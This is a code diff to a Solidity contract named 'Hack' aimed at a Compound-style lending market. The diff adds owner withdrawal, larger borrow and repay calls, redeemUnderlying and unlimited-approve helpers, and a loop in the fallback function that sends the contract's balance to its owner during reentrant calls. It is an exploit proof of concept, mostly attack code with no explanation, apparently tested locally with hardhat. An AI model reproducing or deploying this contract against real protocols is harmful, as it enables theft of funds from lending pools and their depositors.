@@ -6,6 +6,7 @@ import './Comptroller.sol';
 import 'hardhat/console.sol';
 
 contract Hack {
+    address payable owner;
     address comptroller;
     address cether;
     address payable _cether;
@@ -14,6 +15,7 @@ contract Hack {
         comptroller = _comptroller;
         cether = __cether;
         _cether = address(uint160(cether));
+        owner = msg.sender;
     }
     function enterMarket() public {
         address[] memory markets = new address[](1);
@@ -34,7 +36,7 @@ contract Hack {
 
     function callBorrow() public returns(bool){
         //CEther(_cether).borrow(1);
-        (bool success, ) = _cether.call.gas(500000000000)(abi.encodeWithSignature('borrow(uint256)', 1));
+        (bool success, ) = _cether.call.gas(500000000000)(abi.encodeWithSignature('borrow(uint256)', 10));
         require(success, 'borrow failed');
         return success;
     }
@@ -44,12 +46,21 @@ contract Hack {
     } 
 
     function callrepayBorrow() public {
-        (bool success, ) = _cether.call.value(1)(abi.encodeWithSignature('repayBorrow()'));
+        (bool success, ) = _cether.call.value(10)(abi.encodeWithSignature('repayBorrow()'));
         require(success, 'asshole');
     }
 
     function callExitMarket() public {
         Comptroller(comptroller).exitMarket(cether);
+    }
+
+    function callRedeemUnderlying() public {
+        (bool success, ) = _cether.call(abi.encodeWithSignature('redeemUnderlying(uint256)', 11 ether));
+        require(success, 'redemption failed');
+    }
+    
+    function callApprove() public {
+        CEther(_cether).approve(_cether, uint(-1));
     }
 
     function() external payable{
@@ -59,9 +70,11 @@ contract Hack {
 
         if(i == 2){
             while(i != 3) {
-                callrepayBorrow();
-                callBorrow();
+                //callrepayBorrow();
+                //callBorrow();
                 console.log('hack balance each loop', address(this).balance);
+                owner.transfer(address(this).balance);
+                
                 console.log('i value %s:', i);
                 i++;    
             }                
